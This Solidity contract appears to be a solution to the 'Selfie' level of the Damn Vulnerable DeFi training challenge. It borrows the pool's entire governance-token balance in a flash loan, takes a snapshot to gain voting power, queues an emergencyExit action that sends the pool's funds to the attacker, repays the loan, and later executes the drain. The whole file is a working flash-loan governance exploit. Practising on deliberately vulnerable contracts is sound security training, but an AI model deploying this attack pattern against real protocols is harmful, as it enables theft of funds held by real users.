// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SelfiePool } from "../selfie/SelfiePool.sol";
import { SimpleGovernance } from "../selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SelfiePool immutable pool;
    SimpleGovernance immutable govern;
    DamnValuableTokenSnapshot private _governanceToken;
    address immutable public owner;

    constructor( address _pool , address _govern, address governanceToken) {
        pool= SelfiePool(_pool);
        govern = SimpleGovernance(_govern);
        _governanceToken = DamnValuableTokenSnapshot(governanceToken);
        owner = msg.sender;
    }

    function Attack() external {
        bool resp = pool.flashLoan(this, address(_governanceToken), _governanceToken.balanceOf(address(pool)), "0x");
        // pool.maxFlashLoan(address(_governanceToken));
        
    }

    function onFlashLoan(address sender ,address _token , uint amount , uint idk , bytes calldata _data ) external returns(bytes32) {
        _governanceToken.snapshot();
        govern.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)" , owner));
        _governanceToken.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function FinalBlast() public {
        govern.executeAction(1);
    }
}